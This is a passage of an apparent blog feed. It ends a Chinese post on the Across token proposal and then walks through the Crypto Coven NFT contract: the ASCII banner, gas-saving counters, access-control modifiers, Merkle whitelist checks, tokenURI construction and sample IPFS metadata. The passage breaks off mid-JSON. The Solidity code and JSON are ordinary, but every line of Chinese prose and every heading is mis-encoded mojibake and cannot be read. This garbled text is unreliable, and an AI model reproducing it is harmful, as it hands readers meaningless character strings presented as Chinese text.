è®¾ç½®è´¨æŠ¼æœºåˆ¶ï¼Œè¯¥æœºåˆ¶å¯ä»¥æˆäºˆè¿›ä¸€æ­¥çš„æ²»ç†æƒï¼Œå¹¶åˆ†äº«æ•´ä¸ªåè®®çš„æ”¶å…¥ã€‚æ²»ç†å¯ä»¥å†³å®šæ¿€åŠ±å¥–åŠ±çš„æ–¹å‘ï¼Œä»¥ç¡®å®šå“ªäº›ä»£å¸å’Œå“ªäº› L2 åº”è¯¥è·å¾—æ›´å¤šæµåŠ¨æ€§ã€‚è¿™ç§ç±»ä¼¼æŠ•ç¥¨é”å®šçš„æœºåˆ¶å¯ä»¥ä¸º $ACX å’Œ Across åè®®å¢åŠ æ›´å¤šä»·å€¼ã€‚</p><h2><span id="jie-lun">ç»“è®º</span></h2><p>é™¤äº†å»ºç«‹ç¤¾åŒºå’Œæ¿€åŠ±é¡¹ç›®ç›®æ ‡å¤–ï¼ŒAcross ä»£å¸çš„å‘å¸ƒæ—¨åœ¨ä¸ºæ‹¥æœ‰ $ACX åˆ›é€ ä»·å€¼å’Œæ„ä¹‰ã€‚ ç›®æ ‡æ˜¯è®© $ACX ä»£å¸æŒæœ‰è€…åœ¨å¯åŠ¨åç«‹å³é€šè¿‡ä»–ä»¬çš„ä»£å¸ä¸åè®®è¿›è¡Œäº¤äº’ã€‚ äº‹å®ä¸Šï¼Œé€šè¿‡æ¦‚è¿°åœ¨ç©ºæŠ•ä¹‹å‰å°†è·å¾—å¥–åŠ±çš„è¡Œä¸ºï¼Œè¿™ä¸ªåè®®ç°åœ¨æ­£åœ¨é¼“åŠ±æ•´ä¸ª LP æ´»åŠ¨ã€‚ Across å¥–åŠ±é”å®šæ¿€åŠ±è®¡åˆ’å°†å¸å¼•ç¤¾åŒºæˆå‘˜å¹¶ä½¿ç”¨ $ACX ä½œä¸ºè´§å¸æ¥æ¸¸æˆåŒ–å’Œæ¿€åŠ±å¯¹åè®®çš„è´¡çŒ®ã€‚ $ACX ä»£å¸å°†ä»£è¡¨ Across åè®®åœ¨ç»æµå’Œæ²»ç†æ–¹é¢çš„çœŸæ­£æ‰€æœ‰æƒã€‚</p><p>éå¸¸æ¬¢è¿å¯¹æ­¤ææ¡ˆæå‡ºåé¦ˆæ„è§ã€‚ å¯ä»¥è€Œä¸”åº”è¯¥è®¨è®ºæœºåˆ¶å’Œæ•°å­—ï¼Œä»¥ä¾¿ç¤¾åŒºåœ¨æ­¤ä»£å¸å‘å¸ƒä¹‹å‰æ„Ÿåˆ°èˆ’é€‚ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Across ä»£å¸å‘å¸ƒææ¡ˆ v2
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Crypto Coven åŠ å¯†å¥³å·« NFT åˆçº¦è§£è¯»</title>
    <link href="https://qiwihui.com/qiwihui-blog-152/"/>
    <id>https://qiwihui.com/qiwihui-blog-152/</id>
    <published>2024-05-15T02:25:31.374Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦æ˜¯å¯¹ <a href="https://twitter.com/mannynotfound">@mannynotfound</a> çš„æ¨æ–‡ <a href="https://twitter.com/mannynotfound/status/1470535464922845187">https://twitter.com/mannynotfound/status/1470535464922845187</a> çš„æ•´ç†å’Œè¡¥å……ã€‚</p><p>åŠ å¯†å¥³å·«çš„åˆçº¦ä»£ç å ªç§°è‰ºæœ¯å“ã€‚ä»£ç å‡ºè‡ªå·¥ç¨‹å¸ˆ Matthew Di Ferrante(<a href="https://twitter.com/matthewdif">@matthewdif</a>)ï¼Œæ¶‰åŠ gas ä¼˜åŒ–ï¼Œä¿®æ”¹å™¨ä»¥åŠ Opensea é¢„æˆæƒç­‰è¯¸å¤šä¼˜åŒ–æªæ–½ï¼Œå¯¹äºå­¦ä¹  NFT åˆçº¦æ˜¯ä¸ªå¾ˆå¥½çš„å‚è€ƒææ–™ã€‚</p><h3><span id="ji-ben-qing-kuang">åŸºæœ¬æƒ…å†µ</span></h3><p>åç§°ï¼›Crypto Coven</p><p>ç¬¦å·ï¼š WITCH</p><p>åˆçº¦åœ°å€ï¼š0x5180db8f5c931aae63c74266b211f580155ecac8</p><p>åˆçº¦ä»£ç åœ°å€ï¼š<a href="https://etherscan.io/address/0x5180db8f5c931aae63c74266b211f580155ecac8#code">https://etherscan.io/address/0x5180db8f5c931aae63c74266b211f580155ecac8#code</a></p><p>Solidityç‰ˆæœ¬ï¼š <code>^0.8.0</code></p><span id="more"></span><h3><span id="banner">Banner</span></h3><p>è¿™ä¸ª banner å¯ä»¥ä½“ä¼šåˆ°é¡¹ç›®æ–¹æƒ³è¦åšçš„ä¸æ˜¯åƒ Crypto Punks æˆ–è€…å…¶ä»–åƒç´ é£æ ¼ NFT ä¸€æ ·çš„ä½œå“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">.ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚.âœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚.ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚.âœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚</span><br><span class="line"></span><br><span class="line">                                                       s                                            _                                 </span><br><span class="line">                         ..                           :8                                           u                                  </span><br><span class="line">             .u    .    @L           .d``            .88           u.                       u.    88Nu.   u.                u.    u.  </span><br><span class="line">      .    .d88B :@8c  9888i   .dL   @8Ne.   .u     :888ooo  ...ue888b           .    ...ue888b  &#x27;88888.o888c      .u     x@88k u@88c.</span><br><span class="line"> .udR88N  =&quot;8888f8888r `Y888k:*888.  %8888:u@88N  -*8888888  888R Y888r     .udR88N   888R Y888r  ^8888  8888   ud8888.  ^&quot;8888&quot;&quot;8888&quot;</span><br><span class="line">&lt;888&#x27;888k   4888&gt;&#x27;88&quot;    888E  888I   `888I  888.   8888     888R I888&gt;    &lt;888&#x27;888k  888R I888&gt;   8888  8888 :888&#x27;8888.   8888  888R </span><br><span class="line">9888 &#x27;Y&quot;    4888&gt; &#x27;      888E  888I    888I  888I   8888     888R I888&gt;    9888 &#x27;Y&quot;   888R I888&gt;   8888  8888 d888 &#x27;88%&quot;   8888  888R </span><br><span class="line">9888        4888&gt;        888E  888I    888I  888I   8888     888R I888&gt;    9888       888R I888&gt;   8888  8888 8888.+&quot;      8888  888R </span><br><span class="line">9888       .d888L .+     888E  888I  uW888L  888&#x27;  .8888Lu= u8888cJ888     9888      u8888cJ888   .8888b.888P 8888L        8888  888R </span><br><span class="line">?8888u../  ^&quot;8888*&quot;     x888N&gt;&lt;888&#x27; &#x27;*88888Nu88P   ^%888*    &quot;*888*P&quot;      ?8888u../  &quot;*888*P&quot;     ^Y8888*&quot;&quot;  &#x27;8888c. .+  &quot;*88*&quot; 8888&quot;</span><br><span class="line"> &quot;8888P&#x27;      &quot;Y&quot;        &quot;88&quot;  888  ~ &#x27;88888F`       &#x27;Y&quot;       &#x27;Y&quot;          &quot;8888P&#x27;     &#x27;Y&quot;          `Y&quot;       &quot;88888%      &quot;&quot;   &#x27;Y&quot;  </span><br><span class="line">   &quot;P&#x27;                         88F     888 ^                                  &quot;P&#x27;                                &quot;YP&#x27;                 </span><br><span class="line">                              98&quot;      *8E                                                                                            </span><br><span class="line">                            ./&quot;        &#x27;8&gt;                                                                                            </span><br><span class="line">                           ~`           &quot;                                                                                             </span><br><span class="line"></span><br><span class="line">.ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚.âœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚.ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»ã€‚.ãƒ»ã‚œâœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚.âœ­ãƒ».ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚..ãƒ»âœ«ãƒ»ã‚œãƒ»ã€‚</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h3><span id="bi-mian-shi-yong-erc721enumerable">é¿å…ä½¿ç”¨ ERC721Enumerable</span></h3><p>ä½¿ç”¨ <code>ERC721Enumerable</code> ä¼šå¸¦æ¥å¤§é‡ gas æ¶ˆè€—ï¼Œåˆçº¦ä¸­ä½¿ç”¨ <code>ERC721 + Counters</code> çš„æ–¹å¼èŠ‚çœ Gasã€‚ä¸»è¦åŸå› æ˜¯ç”±äº <code>totalSupply()</code> å‡½æ•°çš„ä½¿ç”¨ã€‚</p><p>è¯¦ç»†å¯ä»¥é˜…è¯»æ–‡ç« ï¼š<a href="https://shiny.mirror.xyz/OUampBbIz9ebEicfGnQf5At_ReMHlZy0tB4glb9xQ0E">Cut Minting Gas Costs By Up To 70% With One Smart Contract Tweak</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract CryptoCoven is ERC721, IERC2981, Ownable, ReentrancyGuard &#123;</span><br><span class="line">    using Counters for Counters.Counter;</span><br><span class="line">    using Strings for uint256;</span><br><span class="line"></span><br><span class="line">    Counters.Counter private tokenCounter;</span><br></pre></td></tr></table></figure><h3><span id="xiu-gai-qi-rang-dai-ma-geng-jian-ji-he-qing-xi">ä¿®æ”¹å™¨è®©ä»£ç æ›´ç®€æ´å’Œæ¸…æ™°</span></h3><p>åˆçº¦ä¸­ä½¿ç”¨ä¿®æ”¹å™¨å¯¹æƒé™è¿›è¡Œæ§åˆ¶ï¼Œå…¶ä¸­åŒ…æ‹¬ï¼š</p><ul><li><code>publicSaleActive</code> å…¬å¼€é”€å”®çŠ¶æ€</li><li><code>communitySaleActive</code> ç¤¾åŒºé”€å”®çŠ¶æ€</li><li><code>maxWitchesPerWallet</code> æ¯ä¸ªé’±åŒ…æœ€å¤§ token æ•°é‡</li><li><code>canMintWitches</code> æ§åˆ¶tokenæ€»æ•°é‡</li><li><code>canGiftWitches</code></li><li><code>isCorrectPayment</code> åˆ¤æ–­è´­ä¹°æ—¶ä»·æ ¼æ˜¯å¦æ­£ç¡®</li><li><code>isValidMerkleProof</code> ç”¨äºç™½åå•æœºåˆ¶ä¸­çš„ Merkle éªŒè¯</li></ul><p>è¿™äº›ä¿®æ”¹å™¨å¯ä»¥ä½¿å¾—æƒé™æ§åˆ¶æ›´ç®€ä¾¿ï¼Œä»£ç çš„å¯è¯»æ€§ä¹Ÿå¤§å¤§æå‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ============ ACCESS CONTROL/SANITY MODIFIERS ============</span><br><span class="line"></span><br><span class="line">    modifier publicSaleActive() &#123;</span><br><span class="line">        require(isPublicSaleActive, &quot;Public sale is not open&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier communitySaleActive() &#123;</span><br><span class="line">        require(isCommunitySaleActive, &quot;Community sale is not open&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier maxWitchesPerWallet(uint256 numberOfTokens) &#123;</span><br><span class="line">        require(</span><br><span class="line">            balanceOf(msg.sender) + numberOfTokens &lt;= MAX_WITCHES_PER_WALLET,</span><br><span class="line">            &quot;Max witches to mint is three&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier canMintWitches(uint256 numberOfTokens) &#123;</span><br><span class="line">        require(</span><br><span class="line">            tokenCounter.current() + numberOfTokens &lt;=</span><br><span class="line">                maxWitches - maxGiftedWitches,</span><br><span class="line">            &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier canGiftWitches(uint256 num) &#123;</span><br><span class="line">        require(</span><br><span class="line">            numGiftedWitches + num &lt;= maxGiftedWitches,</span><br><span class="line">            &quot;Not enough witches remaining to gift&quot;</span><br><span class="line">        );</span><br><span class="line">        require(</span><br><span class="line">            tokenCounter.current() + num &lt;= maxWitches,</span><br><span class="line">            &quot;Not enough witches remaining to mint&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isCorrectPayment(uint256 price, uint256 numberOfTokens) &#123;</span><br><span class="line">        require(</span><br><span class="line">            price * numberOfTokens == msg.value,</span><br><span class="line">            &quot;Incorrect ETH value sent&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isValidMerkleProof(bytes32[] calldata merkleProof, bytes32 root) &#123;</span><br><span class="line">        require(</span><br><span class="line">            MerkleProof.verify(</span><br><span class="line">                merkleProof,</span><br><span class="line">                root,</span><br><span class="line">                keccak256(abi.encodePacked(msg.sender))</span><br><span class="line">            ),</span><br><span class="line">            &quot;Address does not exist in list&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="nft-su-cai-de-cun-chu">NFT ç´ æçš„å­˜å‚¨</span></h3><p>NFT é¡¹ç›®éƒ½éœ€è¦åŒ…å«å›¾ç‰‡çš„å­˜å‚¨ï¼Œåˆçº¦å°† NFT å¯¹åº”çš„å…ƒä¿¡æ¯å­˜å‚¨åœ¨ IPFS ä¸­ï¼Œå¹¶å°†å¯¹åº”çš„å›¾ç‰‡å­˜å‚¨éƒ½åœ¨ Amazon S3 å­˜å‚¨ä¸­ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">string private baseURI;    </span><br><span class="line"></span><br><span class="line">function setBaseURI(string memory _baseURI) external onlyOwner &#123;</span><br><span class="line">    baseURI = _baseURI;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC721Metadata-tokenURI&#125;.</span><br><span class="line"> */</span><br><span class="line">function tokenURI(uint256 tokenId)</span><br><span class="line">    public</span><br><span class="line">    view</span><br><span class="line">    virtual</span><br><span class="line">    override</span><br><span class="line">    returns (string memory)</span><br><span class="line">&#123;</span><br><span class="line">    require(_exists(tokenId), &quot;Nonexistent token&quot;);</span><br><span class="line"></span><br><span class="line">    return</span><br><span class="line">        string(abi.encodePacked(baseURI, &quot;/&quot;, tokenId.toString(), &quot;.json&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ <code>tokenId</code> ä¸º <code>1</code> çš„ NFTï¼Œå¯¹åº”çš„ <code>tokenURI</code> ä¸º <code>ipfs://QmZHKZDavkvNfA9gSAg7HALv8jF7BJaKjUc9U2LSuvUySB/1.json</code>ï¼Œåœ¨ IPFS ä¸­å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢çš„å†…å®¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are a WITCH of the highest order. You are borne of chaos that gives the night shape. Your magic spawns from primordial darkness. You are called oracle by those wise enough to listen. ALL THEOLOGY STEMS FROM THE TERROR OF THE FIRMAMENT!&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;external_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.cryptocoven.xyz/witches/1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cryptocoven.s3.amazonaws.com/nyx.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;background_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Background&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sepia&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Skin Tone&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Dawn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Body Shape&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lithe&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Top&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sheer Top (Black)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eyebrows&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Medium Flat (Black)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eye Style&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Eye Color&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cloud&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Mouth&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx (Mocha)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hair (Front)&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hair (Back)&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nyx Long&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hair Color&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Steel&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hat&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Witch (Black)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Necklace&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Moon Necklace (Silver)&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Archetype of Power&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Witch of Woe&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sun Sign&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Taurus&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Moon Sign&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Aquarius&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Rising Sign&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Capricorn&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Will&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wisdom&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wonder&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Woe&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">10</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wit&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;display_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;number&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;trait_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Wiles&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">9</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;coven&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nyx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Witch of Woe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are a WITCH of the highest order.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;hobby&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are borne of chaos that gives the night shape.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;magic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Your magic spawns from primordial darkness.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;typeSpecific&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You are called oracle by those wise enough to listen.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;exclamation&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ALL THEOLOGY STEMS FROM THE TERROR OF THE FIRMAMENT!&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;skills&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;will&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wisdom&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wonder&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;woe&quot;</span><span class="punctuation">:</span> <span class="number">10</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wit&quot;</span><span class="punctuation">:</span> <span class="number">9</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;wiles&quot;</span><span class="punctuation">:</span> <span 